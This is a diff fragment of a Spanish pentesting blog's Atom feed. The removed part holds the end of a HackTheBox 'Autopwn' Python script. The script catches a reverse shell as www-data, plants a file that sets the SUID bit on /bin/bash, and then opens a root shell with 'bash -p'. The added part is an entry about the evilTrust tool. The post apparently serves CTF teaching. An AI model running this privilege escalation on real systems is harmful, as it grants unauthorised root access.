- &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
- &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wait_for_connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
- &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;failure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No se ha obtenido ninguna conexión&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
- &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Se ha obtenido una conexión&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Acceso al sistema como usuario www-data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
- &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Escalación de privilegios&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Creando fichero logcleared.sh en el sistema&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo -e '#!/bin/bash&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;chmod u+s /bin/bash' &amp;gt; /var/www/cmd/logcleared.sh; chmod +x /var/www/cmd/logcleared.sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Archivo logcleared.sh creado&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Obteniendo shell como root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;n&quot;&gt;p3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Pwned!!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
- &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="HackTheBox" /><category term="Autopwn" /><category term="Scripting" /><category term="Sqli" /><category term="Web Exploiting" /><category term="Privilege Escalation" /><category term="Python" /><category term="Pentesting" /><summary type="html">Una máquina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script `Autopwn` que nos habíamos configurado en Python, donde tras su ejecución se nos automatiza la intrusión y la escalada de privilegios mediante el uso de la librería pwn.</summary></entry></feed>
+&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Scripting" /><category term="GitHub" /><category term="Bash" /><category term="Herramientas" /><summary type="html">Recientemente estuve en la h-c0n presentando la herramienta evilTrust. En este artículo, comento la utilidad de la herramienta para todos aquellos que la quieran probar. Gracias a los organizadores del evento por invitarme y a todos los presentes por la gran acogida.</summary></entry></feed>
